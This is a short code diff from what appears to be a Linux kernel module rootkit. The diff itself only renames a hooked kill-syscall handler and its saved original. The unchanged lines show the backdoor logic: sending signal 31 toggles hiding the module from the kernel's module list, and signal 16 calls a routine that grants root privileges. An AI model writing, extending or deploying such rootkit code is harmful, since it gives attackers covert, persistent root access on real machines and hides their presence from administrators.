@@ -3,17 +3,17 @@ static struct list_head *priorModule;
 static short isHidden = 0;
 
 #ifdef PTREGS_SYSCALL_STUBS
-asmlinkage int hookKill(const struct pt_regs *regs) {
+asmlinkage int killHook(const struct pt_regs *regs) {
     int sig = regs->si;
 #else
-asmlinkage int hookKill(pid_t pid, int sig) { 
+asmlinkage int killHook(pid_t pid, int sig) { 
 #endif
     if (sig == 31) return toggleHiding();
     else if (sig == 16) return setRoot();
 #ifdef PTREGS_SYSCALL_STUBS
-    return ogKill(regs);
+    return killOG(regs);
 #else
-    return ogKill(pid, sig);
+    return killOG(pid, sig);
 #endif
 }
 
